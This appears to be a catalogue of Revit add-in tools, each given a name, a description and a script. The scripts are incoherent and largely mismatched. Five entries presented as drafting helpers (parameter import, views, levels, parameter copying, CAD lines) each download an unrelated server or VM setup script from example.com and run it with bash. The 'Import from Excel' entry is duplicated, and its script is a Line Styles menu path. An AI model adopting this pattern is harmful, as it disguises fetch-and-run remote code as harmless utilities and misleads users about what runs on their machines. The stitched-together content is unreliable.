name: Export to Excel
description: Exports schedules, parameters, and lookup tables from the model to Excel for reporting and batch editing. Preserves column mappings and formatting to streamline data hand-off and review.
script:
## Export to Excel

This tool exports schedules, parameters and lookup tables from the model into an Excel workbook for reporting or bulk edits. Output preserves column mappings and adds a small manifest sheet that records parameter-to-column mappings.

Usage notes:

- Exports one or more schedules as separate sheets.
- Preserves parameter column headings; date/time and number formatting is retained where possible.
- Includes a `mapping` sheet describing which model parameter maps to which column.

Example columns produced for a `Doors` schedule:

| Mark | Type | Width | Height | Fire Rating | Comments |

After export you can edit values in Excel and re-import using the complementary `Import from Excel` tool.

#!/bin/bash
echo "Exporting schedules to Excel..."

name: Import Project Parameter
description: Standardizes and imports project-level parameters. Maps incoming parameters to shared definitions, creates missing shared parameters, and enforces naming/grouping conventions.
script:
#!/bin/bash
# install Valkey LXC (import project parameter helper)
wget https://example.com/valkey-lxc.sh -O valkey-lxc.sh
bash valkey-lxc.sh

name: Views Creator
description: Creates standard views (plans, elevations, sections) from templates, applies view templates and naming conventions to speed documentation setup.
script:
#!/bin/bash
# install Views Creator helper
wget https://example.com/qdrant-lxc.sh -O qdrant-lxc.sh
bash qdrant-lxc.sh

name: Levels Setup
description: Automates creation and configuration of building levels, sets elevations and names, and associates levels with grids and views per SvN standards.
script:
#!/bin/bash
# levels setup helper
wget https://example.com/opnsense-vm.sh -O opnsense-vm.sh
bash opnsense-vm.sh

name: Copy Parameters
description: Copies parameter values between elements, families, or linked models to enable bulk updates and synchronization of shared/project parameters.
script:
#!/bin/bash
# copy parameters helper
wget https://example.com/home-assistant-container.sh -O home-assistant-container.sh
bash home-assistant-container.sh

name: CAD Line Tool
description: Imports CAD linework and maps external CAD layers to native Revit line types and styles, converting geometry and applying SvN naming conventions for consistent drafting output.
script:
#!/bin/bash
# CAD line import helper
wget https://example.com/pve-post-install.sh -O pve-post-install.sh
bash pve-post-install.sh

name: Copy Filters
description: Copies view filters and graphical overrides between projects and views, preserving rules and visibility settings and supporting batch mappings.

name: Import from Excel
description: Imports schedules, parameter values and lookup tables from Excel, mapping columns to parameters and performing bulk assignments with validation.
script:
Manage > Additional Settings > Line Styles

![Import from Excel](./images/line-type-tool.png)

name: Import from Excel
description: Imports schedules, parameter values, and lookup tables from Excel into the model, matching columns to parameters and performing bulk assignments with validation and mapping to prevent mismatches.
script:
Manage > Additional Settings > Line Styles

![Line Type Tool](./images/line-type-tool.png)
